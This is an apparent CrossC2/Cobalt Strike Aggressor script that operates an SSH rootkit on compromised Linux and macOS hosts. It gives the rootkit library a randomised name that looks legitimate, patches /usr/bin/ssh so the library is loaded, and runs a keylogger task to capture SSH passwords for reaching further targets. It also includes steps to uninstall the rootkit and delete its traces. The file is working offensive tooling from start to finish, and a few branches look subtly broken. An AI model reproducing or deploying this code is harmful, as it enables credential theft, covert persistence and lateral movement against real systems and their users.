
# include(script_resource("CrossC2Kit.cna"));

sub printUsage_ssh {
    blog($1, "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get the password of ssh to log in to other targets.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
}

sub cc2_ssh {
    $taskName = "cc2_ssh"; # taskName
    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
    $taskResType = "keystrokes"; # keystrokes -> keylogger message

    $beaconid = $1;
    $arch = $2;
    $chose = $3;
    $realPatchName = $4;
    $transportArg = "blankArg";

    if ($arch eq "linux32") {
        $patchlib = "rootkit/auth/ssh_rootkit_module32.so";
        $patch = "patch/libpatchelf32.so";
        $loadlib = "rootkit/auth/ssh_rootkit_mgr32.so";
        $patchType = "so";
    } else if ($arch eq "linux") {
        $patchlib = "rootkit/auth/ssh_rootkit_module.so";
        $patch = "patch/libpatchelf.so";
        $loadlib = "rootkit/auth/ssh_rootkit_mgr.so";
        $patchType = "so";
    } else if ($arch eq "osx") {
        $patchlib = "rootkit/auth/ssh_rootkit.dylib";
        $patch = "install_name_tool";
        $loadlib = "rootkit/auth/ssh_rootkit_mgr.dylib";
        $patchType = "MachO";
    } else {
        berror($beaconid, "*[error]: Only Linux/MacOS is supported for now.");
        printUsage_ssh($beaconid);
        return;
    }
    $patchName = "libk5ccrypto1.0.4.so";

    if ($chose eq "install") {
        blog($beaconid, "patch ssh:");
        $patchHead = @("pcre", "se", "kbr5", "k5c");
        $patchBody = @("dl", "crypto", "resolv", "z");
        $patchVer = @("1.0.4", "1.5.1.2", "1.2.1.3");
        if ($patchType eq "so") {
            $patchEnd = ".so";
        } else {
            $patchEnd = ".dylib";
        }
        $patchName = "lib".$patchHead[rand(4)].$patchBody[rand(4)].$patchVer[rand(3)].$patchEnd;
        blog($beaconid, "patch name: ".$patchName);

        bcrossc2_load_dyn($beaconid, "so", "cc2_ssh_module", "info", $patchlib, $patchName."^")
    } else {
        $patchName = $realPatchName;
        if ($chose eq "patch") {
            if ($patchType eq "so") {
                $patchArg = "--add-needed^".$patchName."^/usr/bin/ssh";
                bcrossc2_load_dyn($beaconid, "so", "cc2_patch", "info", $patch, $patchArg);
            } else if ($patch eq "MachO") {
                $patchArg = "-add_rpath^".$patchName;
                bcrossc2_load_dyn($beaconid, "MachO", "cc2_patch", "info", $patch, $patchArg);
            }
        } else if ($chose eq "run") {
            blog($beaconid, "get password for ssh login:");
            bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
        } else if ($chose eq "uninstall") {
            if ($patchType eq "so") {
                $patchArg = "--remove-needed^".$patchName."^/usr/bin/ssh";
                bcrossc2_load_dyn($beaconid, "so", "cc2_patch", "info", $patch, $patchArg);
            } else if ($patch eq "MachO") {
                $patchArg = "-delete_rpath^".$patchName;
                bcrossc2_load_dyn($beaconid, "MachO", "cc2_patch", "info", $patch, $patchArg);
            }
        } else if ($chose eq "clean") {
            bshell($beaconid, "rm -f /usr/lib/".$patchName);
        } else {
            berror($beaconid, "*[error]: step type");
            printUsage_ssh($beaconid);
        }
    }
}

ssh_alias("cc2_ssh", &cc2_ssh);

ssh_command_register("cc2_ssh", "CrossC2 SSH rootkit - Get the password of ssh to log in to other targets.", "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for ssh login.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");

sub openSSHKitDialogCallBack {
    $patchRandName = $3['patchRandName'];
    $patchName = $3['patchName'];

    if (($patchName eq $null) && ($patchRandName eq $null)) {
        berror($bid, "error with patchName or patchRandName");
    } else {
        $patch_name = "";
        if ($patchName ne "") {
            $patch_name = $patchName;
        } else {
            $patch_name = $patchRandName;
        }
        $os = lc(beacon_info($bid, "os"));
        $arch = beacon_info($bid, "arch");

        blog($bid, "cc2_auth install");
        cc2_auth($bid, "", "install");
        blog($bid, "cc2_auth run");
        cc2_auth($bid, "", "run");
    }
}

sub openSSHKitDialog {
    $bid = $1;
    $dialog = dialog("PAM auth log", %(bid => $bid, patchRandName => "libk5ccrypto1.0.4.so", patchName => ""), &openSSHKitDialogCallBack);
    dialog_description($dialog, "pam auth log");
    
    $patchName = "libk5ccrypto1.0.4.so";

    $patchHead = @("pcre", "se", "kbr5", "k5c");
    $patchBody = @("dl", "crypto", "resolv", "z");
    $patchVer = @("1.0.1", "1.2.1.2", "1.0.1.3");
    $patchEnd = ".so";

    @patchNameArray = @();
    for ($x = 0; $x < 5; $x++) {
        push(@patchNameArray, "lib".$patchHead[rand(4)].$patchBody[rand(4)].$patchVer[rand(3)].$patchEnd);
    }

    drow_text($dialog, "patchName", "patchName: ");
    drow_combobox($dialog, "patchRandName", "patchRandName: ", @patchNameArray);

    dbutton_action($dialog, "run");
    dialog_show($dialog);
}

sub openSSHKitUninstallDialogCallBack {
    $patchName = $3['patchName'];

    cc2_auth($bid, "", "uninstall", $patchName);
}

sub openSSHKitUninstallDialog {
    $bid = $1;
    $dialog = dialog("PAM auth log uninstall", %(bid => $bid, patchName => ""), &openSSHKitUninstallDialogCallBack);
    dialog_description($dialog, "pam auth log uninstall");

    drow_text($dialog, "patchName", "patchName: ");

    dbutton_action($dialog, "uninstall");
    dialog_show($dialog);
}


sub cc2_ssh_status {
    local('$bid $os $arch $system');
    $bid = $1;
    $os = lc(beacon_info($bid, "os"));
    $arch = beacon_info($bid, "arch");
    if ('linux' isin $os) {
        if ($arch eq 'x64') {
            return 'Linux64';
        } else if ($arch eq 'x86') {
            return 'Linux32';
        }
    } else if ('macos' isin $os) {
        return 'MacOS(intel)';
    }
    return '';
}